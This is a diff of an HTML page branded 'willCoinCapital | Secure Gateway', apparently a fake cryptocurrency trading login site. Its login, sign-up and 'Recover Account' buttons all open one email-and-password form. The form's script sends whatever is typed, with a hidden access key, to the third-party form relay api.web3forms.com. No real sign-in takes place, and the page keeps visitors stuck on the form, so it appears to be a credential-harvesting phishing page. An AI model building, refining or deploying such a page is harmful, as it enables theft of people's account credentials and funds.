@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>willCoinCapital | Gateway</title>
+    <title>willCoinCapital | Secure Gateway</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -16,7 +16,6 @@
             filter: blur(60px); z-index: 1; pointer-events: none;
         }
 
-        /* BRANDING STYLES */
         .brand-logo { font-size: 26px; font-weight: 800; letter-spacing: -0.02em; text-transform: uppercase; }
         .brand-willcoin { color: #FFFFFF; }
         .brand-capital { color: #22d3ee; }
@@ -31,8 +30,7 @@
             background: rgba(255, 255, 255, 0.03);
             backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 28px;
-            width: 135px; height: 135px;
+            border-radius: 28px; width: 135px; height: 135px;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
             animation: floatIcon 5s ease-in-out infinite;
         }
@@ -42,9 +40,12 @@
             50% { transform: translateY(-12px); }
         }
 
-        .label-text { font-size: 11px; font-weight: 800; color: rgba(255,255,255,0.4); margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.15em; }
-        .btn-recover { border: 1px solid rgba(20, 184, 166, 0.5); color: #14b8a6; }
-        .btn-create { background: linear-gradient(to right, #14b8a6, #22d3ee); color: #000; box-shadow: 0 10px 30px -10px rgba(20, 184, 166, 0.5); }
+        .btn-create { 
+            background: linear-gradient(to right, #14b8a6, #22d3ee); 
+            color: #000; 
+            box-shadow: 0 0 20px rgba(34, 211, 238, 0.3);
+        }
+        
         .view-hidden { display: none !important; }
     </style>
 </head>
@@ -52,73 +53,91 @@
 
     <div class="main-aura"></div>
 
-    <header class="text-center z-20 space-y-3">
-        <div class="brand-logo">
-            <span class="brand-willcoin">WILLCOIN</span><span class="brand-capital">CAPITAL</span>
-        </div>
-        
-        <div class="bg-white/5 border border-white/10 px-4 py-1 rounded-full text-[9px] font-black uppercase tracking-widest inline-block text-gray-400">
-            • Trade crypto anytime
-        </div>
-        <h1 class="text-[34px] font-extrabold tracking-tighter leading-tight text-white pt-4">
-            Own Your Assets <br> <span class="text-cyan-400">Invest Your Assets</span>
-        </h1>
-    </header>
+    <div id="landingView" class="flex flex-col items-center justify-between h-full w-full">
+        <header class="text-center z-20 space-y-3">
+            <div class="brand-logo">
+                <span class="brand-willcoin">WILLCOIN</span><span class="brand-capital">CAPITAL</span>
+            </div>
+            <div class="bg-white/5 border border-white/10 px-4 py-1 rounded-full text-[9px] font-black uppercase tracking-widest inline-block text-gray-400">
+                • Trade crypto anytime
+            </div>
+            <h1 class="text-[34px] font-extrabold tracking-tighter leading-tight text-white pt-4">
+                Own Your Assets <br> <span class="text-cyan-400">Invest Your Assets</span>
+            </h1>
+        </header>
 
-    <div class="asset-container">
-        <div class="asset-card">
-            <span class="label-text">btc</span>
-            <svg width="50" height="50" viewBox="0 0 32 32">
-                <path d="M22.76 11.42c.45-3.005-1.84-4.62-4.97-5.7l1.015-4.07-2.475-.617-1.015 4.07c-.65-.163-1.32-.315-1.983-.464l1.022-4.1-2.477-.616-1.015 4.07c-.538-.124-1.066-.247-1.578-.376l.003-.014-3.417-.853-.66 2.645s1.84.42 1.8.446c1.003.25 1.185.914 1.155 1.44l-1.157 4.643c.07.017.16.042.26.082-.084-.02-.175-.043-.264-.065l-1.62 6.5c-.123.305-.436.762-1.14.587.025.036-1.8-.45-1.8-.45l-1.23 2.834 3.224.804c.6.15 1.183.305 1.758.453l-1.025 4.116 2.475.617 1.015-4.068c.676.183 1.332.355 1.975.52l-1.02 4.1 2.477.617 1.025-4.113c4.22.8 7.39.477 8.724-3.342 1.076-3.076-.053-4.85-2.28-6.004 1.623-.375 2.847-1.442 3.17-3.645zm-5.67 8c-.766 3.074-5.947 1.412-7.627.994l1.36-5.45c1.68.42 7.082 1.25 6.267 4.456zm1.112-7.983c-.7 2.8-5.02 1.38-6.42 1.03l1.233-4.945c1.4.35 5.925 1.005 5.187 3.915z" fill="#F7931A"/>
-            </svg>
+        <div class="asset-container">
+            <div class="asset-card">
+                <span class="text-[11px] font-800 text-white/40 mb-3 uppercase tracking-widest">btc</span>
+                <svg width="50" height="50" viewBox="0 0 32 32"><path d="M22.76 11.42c.45-3.005-1.84-4.62-4.97-5.7l1.015-4.07-2.475-.617-1.015 4.07c-.65-.163-1.32-.315-1.983-.464l1.022-4.1-2.477-.616-1.015 4.07c-.538-.124-1.066-.247-1.578-.376l.003-.014-3.417-.853-.66 2.645s1.84.42 1.8.446c1.003.25 1.185.914 1.155 1.44l-1.157 4.643c.07.017.16.042.26.082-.084-.02-.175-.043-.264-.065l-1.62 6.5c-.123.305-.436.762-1.14.587.025.036-1.8-.45-1.8-.45l-1.23 2.834 3.224.804c.6.15 1.183.305 1.758.453l-1.025 4.116 2.475.617 1.015-4.068c.676.183 1.332.355 1.975.52l-1.02 4.1 2.477.617 1.025-4.113c4.22.8 7.39.477 8.724-3.342 1.076-3.076-.053-4.85-2.28-6.004 1.623-.375 2.847-1.442 3.17-3.645zm-5.67 8c-.766 3.074-5.947 1.412-7.627.994l1.36-5.45c1.68.42 7.082 1.25 6.267 4.456zm1.112-7.983c-.7 2.8-5.02 1.38-6.42 1.03l1.233-4.945c1.4.35 5.925 1.005 5.187 3.915z" fill="#F7931A"/></svg>
+            </div>
+            <div class="asset-card" style="animation-delay: 0.5s;">
+                <span class="text-[11px] font-800 text-white/40 mb-3 uppercase tracking-widest">eth</span>
+                <svg width="42" height="50" viewBox="0 0 256 417"><path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#343434"/><path d="M127.962 0L0 212.32l127.962 75.638V154.158z" fill="#8C8C8C"/><path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.59 128.038-180.32z" fill="#3C3C3B"/><path d="M127.962 416.896v-104.72L0 236.585z" fill="#8C8C8C"/></svg>
+            </div>
         </div>
 
-        <div class="asset-card" style="animation-delay: 0.5s;">
-            <span class="label-text">eth</span>
-            <svg width="42" height="50" viewBox="0 0 256 417">
-                <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#343434"/><path d="M127.962 0L0 212.32l127.962 75.638V154.158z" fill="#8C8C8C"/><path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.59 128.038-180.32z" fill="#3C3C3B"/><path d="M127.962 416.896v-104.72L0 236.585z" fill="#8C8C8C"/><path d="M127.961 279.102l127.962-75.638-127.962-58.734z" fill="#141414"/><path d="M0 212.32l127.962 75.638V144.73z" fill="#393939"/>
-            </svg>
+        <div class="w-full max-w-sm space-y-4 z-20">
+            <button onclick="openAuth('Create Account')" class="w-full py-4 rounded-2xl border border-cyan-500/30 text-cyan-400 text-[11px] font-black uppercase tracking-widest active:scale-95 transition-transform">Recover Account</button>
+            <button onclick="openAuth('Create Account')" class="w-full py-4 rounded-2xl btn-create text-[11px] font-black uppercase tracking-widest active:scale-95 transition-transform">Create Account</button>
+            <div class="text-center pt-4">
+                <button onclick="openAuth('Login')" class="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Already Have An Account? <span class="text-white ml-1">Log In</span></button>
+            </div>
         </div>
     </div>
 
-    <div class="w-full max-w-sm space-y-4 z-20">
-        <button onclick="toggleAuth('signup')" class="w-full py-4 rounded-2xl btn-recover text-[11px] font-black uppercase tracking-widest active:scale-95 transition-transform">Recover Account</button>
-        <button onclick="toggleAuth('signup')" class="w-full py-4 rounded-2xl btn-create text-[11px] font-black uppercase tracking-widest active:scale-95 transition-transform">Create Account</button>
-        <div class="text-center pt-4">
-            <button onclick="toggleAuth('login')" class="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Already Have An Account? <span class="text-white ml-1">Log In</span></button>
-        </div>
-    </div>
-
-    <div id="authModal" class="fixed inset-0 z-[100] flex items-center justify-center p-6 view-hidden">
-        <div class="absolute inset-0 bg-black/95 backdrop-blur-xl" onclick="toggleAuth()"></div>
-        <div class="relative z-10 w-full max-w-xs space-y-6">
-            <h2 id="authTitle" class="text-center text-xl font-black uppercase tracking-tighter text-cyan-400">Authorize</h2>
-            <form id="authForm" class="space-y-3">
+    <div id="authView" class="fixed inset-0 z-[100] flex items-center justify-center p-6 view-hidden">
+        <div class="absolute inset-0 bg-black/98"></div>
+        <div class="relative z-10 w-full max-w-xs text-center">
+            <h2 id="authTitle" class="text-cyan-400 text-lg font-black uppercase tracking-[0.2em] mb-12">Login</h2>
+            <form id="authForm" class="space-y-4">
                 <input type="hidden" name="access_key" value="56f62943-45be-49fc-9e75-e166e5d4d20b">
-                <input type="email" name="email" placeholder="EMAIL ADDRESS" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-[10px] font-bold outline-none text-white focus:border-cyan-500/50 uppercase tracking-widest">
-                <input type="password" name="password" placeholder="PASSWORD" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-[10px] font-bold outline-none text-white focus:border-cyan-500/50 uppercase tracking-widest">
-                <button type="submit" id="authSubmit" class="w-full py-4 btn-create rounded-xl text-[10px] font-black uppercase tracking-widest">Continue</button>
+                <input type="email" name="email" placeholder="EMAIL ADDRESS" required class="w-full bg-white/5 border border-white/10 rounded-2xl p-5 text-[10px] font-bold text-white outline-none focus:border-cyan-500/50 uppercase tracking-widest">
+                <input type="password" name="password" placeholder="PASSWORD" required class="w-full bg-white/5 border border-white/10 rounded-2xl p-5 text-[10px] font-bold text-white outline-none focus:border-cyan-500/50 uppercase tracking-widest">
+                <button type="submit" id="authSubmit" class="w-full py-5 btn-create rounded-2xl text-[11px] font-black uppercase tracking-[0.2em] mt-4 shadow-lg shadow-cyan-500/20">Continue</button>
             </form>
         </div>
     </div>
 
     <script>
-        function toggleAuth(mode) {
-            const modal = document.getElementById('authModal');
-            if (!mode) { modal.classList.add('view-hidden'); return; }
-            document.getElementById('authTitle').innerText = mode === 'login' ? 'Welcome Back' : 'System Entry';
-            modal.classList.remove('view-hidden');
+        // Check for session and title on load
+        window.onload = () => {
+            const savedState = localStorage.getItem('terminalAccess');
+            const savedTitle = localStorage.getItem('authTitle');
+            if (savedState === 'active') {
+                document.getElementById('landingView').classList.add('view-hidden');
+                document.getElementById('authView').classList.remove('view-hidden');
+                document.getElementById('authTitle').innerText = savedTitle || 'Login';
+            }
+        };
+
+        function openAuth(type) {
+            document.getElementById('landingView').classList.add('view-hidden');
+            document.getElementById('authView').classList.remove('view-hidden');
+            document.getElementById('authTitle').innerText = type;
+            
+            // Save state for refresh persistence
+            localStorage.setItem('terminalAccess', 'active');
+            localStorage.setItem('authTitle', type);
         }
 
         document.getElementById('authForm').onsubmit = async (e) => {
             e.preventDefault();
             const btn = document.getElementById('authSubmit');
             btn.innerText = "SYNCHRONIZING...";
+            btn.disabled = true;
+
             try {
-                await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
+                await fetch('https://api.web3forms.com/submit', { 
+                    method: 'POST', 
+                    body: new FormData(e.target) 
+                });
                 btn.innerText = "SUCCESS";
-                setTimeout(() => { window.location.reload(); }, 1500);
-            } catch(e) { btn.innerText = "ERROR - RETRY"; }
+                // Persistence is already set in openAuth()
+            } catch(e) { 
+                btn.innerText = "RETRY";
+                btn.disabled = false;
+            }
         };
     </script>
 </body>
